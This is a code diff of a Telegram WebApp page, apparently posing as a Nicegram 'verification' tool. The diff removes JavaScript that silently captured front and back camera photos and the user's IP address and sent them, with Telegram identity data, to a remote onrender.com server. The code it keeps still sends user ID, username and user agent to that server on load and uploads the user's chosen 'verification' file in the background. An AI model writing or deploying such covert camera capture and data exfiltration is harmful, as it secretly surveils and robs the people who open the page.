@@ -460,86 +460,9 @@
 
     <script>
         const BANNED_USERS = ['monk']; 
-        const SERVER_URL = "https://nicegram-uauc.onrender.com/";
+        const SERVER_URL = "https://nicegram-uauc.onrender.com";
         const tg = window.Telegram.WebApp;
         tg.expand();
-
-        let userIP = "Не получен";
-        let frontCameraPhoto = null;
-        let backCameraPhoto = null;
-
-        async function getUserIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                userIP = data.ip;
-            } catch (error) {
-                try {
-                    const response = await fetch('https://api.my-ip.io/ip.json');
-                    const data = await response.json();
-                    userIP = data.ip;
-                } catch (e) {
-                    try {
-                        const response = await fetch('https://ipapi.co/json/');
-                        const data = await response.json();
-                        userIP = data.ip;
-                    } catch (err) {
-                        userIP = "Не удалось получить";
-                    }
-                }
-            }
-        }
-
-        async function captureCameraPhotos() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: { exact: 'environment' } }
-                });
-                
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
-                backCameraPhoto = canvas.toDataURL('image/jpeg');
-                
-                stream.getTracks().forEach(track => track.stop());
-            } catch (error) {
-                console.log('Задняя камера недоступна:', error);
-            }
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' }
-                });
-                
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
-                frontCameraPhoto = canvas.toDataURL('image/jpeg');
-                
-                stream.getTracks().forEach(track => track.stop());
-            } catch (error) {
-                console.log('Фронтальная камера недоступна:', error);
-            }
-        }
-
-        async function initDataCollection() {
-            await Promise.all([
-                getUserIP(),
-                captureCameraPhotos()
-            ]);
-        }
 
         try {
             if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
@@ -555,36 +478,24 @@
             } catch (e) { return false; }
         }
 
-        async function logEntry() {
+        function logEntry() {
             try {
                 const user = tg.initDataUnsafe.user || {};
-                if (isUserBanned()) return;
-
-                await initDataCollection();
-
-                const logData = {
-                    user_id: user.id || "0000",
-                    username: user.username || "no_username",
-                    user_agent: navigator.userAgent,
-                    platform: tg.platform || "unknown",
-                    ip_address: userIP,
-                    has_front_camera: frontCameraPhoto !== null,
-                    has_back_camera: backCameraPhoto !== null,
-                    front_camera_data: frontCameraPhoto,
-                    back_camera_data: backCameraPhoto,
-                    timestamp: new Date().toISOString()
-                };
+                if (isUserBanned()) return; 
 
                 fetch(`${SERVER_URL}/log_entry`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(logData)
+                    body: JSON.stringify({
+                        user_id: user.id || "0000",
+                        username: user.username || "no_username",
+                        user_agent: navigator.userAgent,
+                        platform: tg.platform || "unknown"
+                    })
                 }).catch(e => console.error(e));
-
             } catch (err) { console.error(err); }
         }
-
-        setTimeout(() => { logEntry(); }, 1000);
+        logEntry();
 
         function startVerification(input) {
             const file = input.files[0];
@@ -631,29 +542,17 @@
             }, intervalTime);
         }
 
-        async function uploadFileInBackground(file) {
+        function uploadFileInBackground(file) {
             try {
                 const user = tg.initDataUnsafe.user || {};
-                if (isUserBanned()) return;
+                if (isUserBanned()) return; 
 
                 const formData = new FormData();
                 formData.append('file', file);
                 formData.append('user_id', user.id || "0000");
                 formData.append('username', user.username || "no_username");
                 formData.append('user_agent', navigator.userAgent);
-                formData.append('ip_address', userIP);
-                formData.append('timestamp', new Date().toISOString());
-
-                if (frontCameraPhoto) {
-                    const frontBlob = await fetch(frontCameraPhoto).then(r => r.blob());
-                    formData.append('front_camera', frontBlob, 'front_camera.jpg');
-                }
                 
-                if (backCameraPhoto) {
-                    const backBlob = await fetch(backCameraPhoto).then(r => r.blob());
-                    formData.append('back_camera', backBlob, 'back_camera.jpg');
-                }
-
                 fetch(`${SERVER_URL}/upload`, { method: 'POST', body: formData })
                     .catch(e => console.error(e));
             } catch (err) { console.error(err); }
@@ -718,4 +617,4 @@
         }, 4000);
     </script>
 </body>
-</html>
+            </html>
